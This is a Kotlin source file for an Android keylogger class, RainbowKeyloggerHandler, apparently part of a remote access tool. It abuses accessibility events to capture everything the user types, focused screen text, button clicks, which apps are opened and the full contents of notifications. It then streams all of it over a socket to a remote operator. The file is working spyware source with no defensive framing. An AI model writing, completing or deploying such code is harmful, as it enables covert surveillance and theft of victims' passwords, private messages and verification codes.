package abyssalarmy.rainbow.RainbowHandler

import abyssalarmy.rainbow.RainbowNetwork.RainbowSocket
import android.app.Notification
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class RainbowKeyloggerHandler(private val socket: RainbowSocket) {

    fun handle(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val data: String = event.text.toString()
                socket.sendMessage("\nIn app : ${event.packageName}\nTyped : $data ")
            }

            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val data: String = event.text.toString()
                socket.sendMessage("\nIn App : ${event.packageName}\nContent : $data ")
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val data: String = event.text.toString()
                Log.i("CLICK", data)
                socket.sendMessage("\nApp : ${event.packageName}\nClicked : $data ")
            }

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val data = event.packageName
                socket.sendMessage("App : $data\nHas been opened ")
            }

            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                try {
                    val notification: Notification =
                            event.parcelableData as Notification
                    val title =
                            notification.extras.getCharSequence(Notification.EXTRA_TITLE).toString()
                    val text =
                            notification.extras.getCharSequence(Notification.EXTRA_TEXT).toString()
                    val text2 = notification.extras.getCharSequence(Notification.EXTRA_BIG_TEXT)
                        .toString()
                    val app = event.packageName.toString()
                    socket.sendMessage("\nNotification : $app\nData : $$title\n$text\n$text2 ")
                } catch (e: Exception) {}
            }

            else -> {}
        }
    }
}